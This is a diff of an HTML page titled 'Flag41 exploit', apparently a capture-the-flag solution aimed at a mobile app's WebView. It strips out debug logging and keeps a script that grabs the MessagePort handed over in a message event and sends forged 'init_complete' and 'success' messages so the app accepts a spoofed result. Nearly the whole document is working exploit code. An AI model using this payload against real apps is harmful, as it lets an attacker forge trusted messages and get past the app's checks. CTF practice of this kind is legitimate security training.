@@ -2,73 +2,20 @@
 <html>
 <body>
 <h3>Flag41 exploit</h3>
-<div id="log" style="background:#000; color:#0f0; padding:10px; font-family:monospace; white-space:pre-wrap;"></div>
-
 <script>
-const logEl = document.getElementById('log');
-function log(msg) {
-    logEl.textContent += msg + '\n';
-    console.log(msg);
-}
-
-log('🔍 Waiting for message event...');
-
 window.addEventListener("message", function (event) {
-    log('📨 Message event received!');
-    log('Data: ' + JSON.stringify(event.data));
-    log('Ports: ' + (event.ports ? event.ports.length : 0));
-    
-    if (!event.ports || event.ports.length === 0) {
-        log('❌ No ports available, returning');
-        return;
-    }
-    
-    const port = event.ports[0];
-    log('✅ Port captured!');
-    
-    // IMPORTANT: Start the port!
-    port.start();
-    
-    // Listen for messages from the app
-    port.onmessage = function(e) {
-        log('📩 [app->web] ' + JSON.stringify(e.data));
-        
-        // If app sends init, respond with success
-        if (e.data === 'init' || e.data === '"init"') {
-            log('Got init, sending success...');
-            port.postMessage(JSON.stringify({ message: "success" }));
-        }
-    };
-    
-    // If the event.data itself is "init", respond immediately
-    if (event.data === 'init' || event.data === '"init"') {
-        log('🎯 Init detected in event.data, sending success immediately...');
-        
-        // Small delay to ensure port is ready
-        setTimeout(() => {
-            port.postMessage(JSON.stringify({ message: "success" }));
-            log('✅ Success message sent!');
-        }, 100);
-    } else {
-        // If we don't see init, just send success anyway after delay
-        log('⏳ No init in event.data, sending success after delay...');
-        setTimeout(() => {
-            port.postMessage(JSON.stringify({ message: "success" }));
-            log('✅ Success message sent!');
-        }, 1000);
-    }
-    
-    // Also try sending init_complete first (your original approach)
-    setTimeout(() => {
-        port.postMessage(JSON.stringify({ message: "init_complete" }));
-        log('📤 Sent init_complete');
-    }, 200);
+  if (!event.ports || event.ports.length === 0) return;
+  const port = event.ports[0];
+  port.onmessage = function(e) {
+    console.log("[app->web]", e.data);
+  };
+   
+  port.postMessage(JSON.stringify({ message: "init_complete" }));
+ 
+  setTimeout(() => {
+    port.postMessage(JSON.stringify({ message: "success" }));
+  }, 1000);
 });
-
-// Error handling
-window.onerror = function(msg, url, line) {
-    log('❌ ERROR: ' + msg + ' at line ' + line);
-};
 </script>
 </body>
 </html>
